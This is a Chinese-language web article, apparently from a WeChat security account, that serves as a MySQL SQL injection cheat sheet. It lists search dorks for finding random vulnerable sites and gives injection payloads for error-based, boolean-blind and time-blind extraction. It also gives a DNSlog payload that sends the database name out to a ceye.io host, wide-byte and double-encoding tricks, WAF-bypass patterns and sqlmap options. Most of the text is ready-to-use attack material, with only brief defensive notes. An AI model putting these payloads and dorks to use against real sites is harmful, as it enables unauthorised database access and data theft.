\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/NYthzsRYMcYpHId40E8mxQ)

当所有情绪都堆在一起的时候，才发现自己已经不是那个一块糖就能开心的小孩子了。。。

\----  网易云热评

一、MySql 注入常用函数

1、system\_user() 系统用户名

2、user() 用户名

3、current\_user() 当前用户名

4、session\_user() 链接数据库的用户名

5、database() 数据库名

6、version() 数据库版本

7、@@datadir 数据库路径

8、@@basedir 数据库安装路径

9、@@version\_conpile\_os 操作系统

10、count() 返回执行结果数量

11、concat() 没有分隔符的链接字符串

12、concat\_ws() 含有分隔符的连接字符串

13、group\_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据

14、load\_file() 读取本地文件

15、into outfile 写文件

16、ascii() 字符串的 ASCII 代码值

17ord() 返回字符串第一个字符的 ASCII 值

18mid() 返回一个字符串的一部分

19substr() 返回一个字符串的一部分

20、length() 返回字符串的长度

21、left() 返回字符串最左面几个字符

22、floor() 返回小于或等于 x 的最大整数

23、rand() 返回 0 和 1 之间的一个随机数

24、extractvalue()

第一个参数: XML\_docment 是 String 格式，为 XML 文档对象的名称，文中为 Doc

第二个参数：XPath\_string(Xpath 格式的字符串)

作用：从目标 XML 中返回包含所查询值的字符串

25、updatexml()

第一个参数: XML\_docment 是 String 格式，为 XML 文档对象的名称，文中为 Doc

第二个参数：Xpath\_string(Xpath 格式的字符串)

第三个参数: new\_value,String 格式，替换查找到的符合条件的数据 target.com

作用: 改变文档中符合条件的节点的值

26、sleep() 让此语句运行 N 秒钟

27、if() SELECT IF(1>2,2,3) ; -->3

28、char() 返回整数 ASCII 代码字符组成的字符串

29、strcmp() 比较字符串内容

30、ifnull() 假如参数 1 不为 NULL，则返回值为参数 1，否则其返回值为参数 2

31exp() 返回 e 的 x 次方

二、目标搜集

1、无特定目标：inurl:.php?id=

2、有特定目标：inurl:php?id= site:

3、工具爬取：spider, 对搜索引擎和目标网站的链接进行爬取

三、注入识别

1、手工简单识别:

'

and 1=1/and 1=2

and '1'='1/and'1'='2

and 1like 1/and 1like 2

2、工具识别：

sqlmap -m filename(filename 中保存检测目标)

sqlmap --crawl(sqlmap 对目标网站进行爬取，然后一次进行测试)

3、高级识别

扩展识别广度和深度:

SqlMap --level 增加测试级别，对 header 中相关参数也进行测试

sqlmap -r filename(filename 中为网站请求数据)

利用工具识别提高效率

BurpSuite+Sqlmap

BurpSuite 拦截所有浏览器访问提交的数据

BurpSuite 扩展插件，直接调用 SqlMap 进行测试一些 Tips

可以在参数后键入 "\*" 来确定想要测试的参数

可能出现的点：新闻、登录、搜索、留言

站在开发的角度去寻找

四、报错注入方法

1、floor() :select count(\*) from information\_schema.tables group by concat((select

2、version()),floor(rand(0)\*2));https://github.com/ADOOO/Dnslogsqlinj

3、group by 会对 rand() 函数进行操作时产生错误

4、concat: 连接字符串功能

5、floor: 取 float 的整数值

6、rand: 取 0~1 之间随机浮点值

7、group by: 根据一个或多个列对结果集进行分组并有排序功能

8、extractvalue():extractvalue(1,concat(0x7e,(select user()),0x7e));

9、updatexml():select updatexml(1,concat(0x7e,(select user()),0x7e),1);

五、布尔盲注

1、left() 函数

left(database(),1)>'s'

database() 显示数据库名称, leȨ(a,b) 从左侧截取 a 的前 b 位

2、regexp

select user() regexp'^r'

正则表达式的用法 user() 结果为 root,regexp 为匹配 root 的正则表达式

3、like

select user() like'^ro%'

与 regexp 类似，使用 like 进行匹配

4、substr() 函数 ascii() 函数

substr() 函数 ascii(substr((select database()),1,1))<>98

substr(a,b,c) 从 b 位置开始，截取字符串 a 的 c 长度，ascii() 将某个字符转换为 ascii 值

5、ord() 函数 mid() 函数

ord(mid((select user()),1,1))=114

mid(a,b,c) 从位置 b 开始，截取 a 字符串的 c 位 ord() 函数同 ascii(), 将字符转为 ascii 值

六、时间盲注

if(left(user(),1)='a',0,sleep(3));

七、DNSlog 注入

SELECT LOAD\_FILE(CONCAT('\\\\\\\\',select database(),'.mysql.r4ourp.ceye.io\\\\abc'));

八、宽字节注入

1、在注入点后键入 %df, 然后按照正常的诸如流程开始注入

2、黑盒测试：

在可能的注入点后键入 %df, 之后进行注入测试

3、白盒测试：

查看 MySql 编码是否为 GBK

是否使用 preg\_replace 把单引号替换成 \\'

是否使用 addslashes 进行转义

是否使用 mysql\_real\_escape\_string 进行转义

4、防止宽字节注入

使用 utf-8, 避免宽字节注入

ps: 不仅在 gbk, 韩文、日文等等都是宽字节，都很有可能存在宽字节注入漏洞

mysql\_real\_escape\_string,mysql\_set\_charset('gbk',$conn);

设置参数，character\_set\_client=binary

九、二次编码

1、在注入点后键入 %2527, 然后按照正常的注入流程开始注入

2、黑盒测试：

在可能的注入点后键入 %2527, 之后进行注入测试

3、白盒测试

是否使用 urldecode 函数

urldecode 函数是否存在转义方法之后

十、二次注入

1、插入恶意数据

第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。

2、引用恶意数据

在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了而已数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入。

3、二次注入防御：

对外部提交的数据，需要更加谨慎的对待。

程序内部的数据调用，也要严格的进行检查，一旦不小心，测试者就能将特定了 SQL 语句带入到查询当中。

十一、WAF 绕过

熟练掌握 MySQL 函数和语法使用方法 + 深入了解中间件运行处理机制 + 了解 WAF 防护原理及方法 = 随心所欲的绕过 WAF 的保护

1、白盒绕过

使用了 blacklist 函数过滤了'or'和'AND'

大小写变形: Or,OR,oR

等价替换：and->&&,or->||

2、黑盒绕过

寻找源站 -> 针对云 WAF

利用同网段 -> 绕过 WAF 防护区域

利用边界漏洞 -> 绕过 WAF 防护区域

资源限制角度绕过 WAF

POST 大 BODY

请求方式变换 GET->POST

Content-Type 变换：application/x-www-form-urlencoded;->multipart/form-data;

参数污染

SQL 注释符绕过

Level-1:union/\*\*/select

Level-2:union/\*aaaa%01bbs\*/select

Level-3:union/\*aaaaaaaaaaaaaaaaaaaaaaa\*/select

内联注释:/\*!xxx\*/

空白符绕过

MySQL 空白符：%09,%0A,%0B,%0D,%20,%0C,%A0,/\*XXX\*/

正则的空白符:%09,%0A,%0B,%0D,%20

Example-1:union%250Cselect

Example-2:union%25A0select

concat%2520(

concat/\*\*/(

concat%250c(http://127.0.0.1/Less/?id=1

concat%25a0(

浮点数词法解析

select \* from users where id=8E0union select 1,2,3

select \* from users where id=8.0union select 1,2,3

select \* from users where id=\\Nunion select 1,2,3

extractvalue(1.concat(0x5c,md5(3)));

updatexml(1,concat(0x5d,md5(3))),1);

GeometryCollection((select\*from(select@@version)f)x))

polygon((select\*from(select name\_const(version(),1))x))

linestring()

multipoint()

multilinestring()

multipolygon()

MySQL 特殊语法

select{x table\_name}from{x information\_schema.tables};

3、Fuzz 绕过

注释符绕过

最基本的: union/\*\*/select

中间引入特殊字: union/\*aaa%0abbs\*/select

最后测试注释长度: union/\*aaaaaaaaaaaaaaa\*/select

最基本的模式: union/\*something\*/select

a1%!%2f

十二、sqlmap 的 conf

sqlmap.py -v3(主函数入口)

\--user-agent=websecurity(请求扩充)

\--threads=5(访问优化)

\-p id 注入配置

\--level 3（检测配置）

\--technique=E(注入技术)

\--current-user(信息获取)

\--flush-session（通用设置）

\--beep(杂项) 幕布 - 极简大纲笔记 | 一键生成思维导图

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvU52er0C70avTDRgvIPgoRdCliav8mIQG4bQ7icsgVnR0dM8jNpXhdIErssfHzpznU4Oyic3swywKmQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvU52er0C70avTDRgvIPgoRXic9R0eym42RggrSz4vxiar2SBKtib8JiaK5OjS7aiboicu5tUoo7n3PDpVA/640?wx_fmt=jpeg)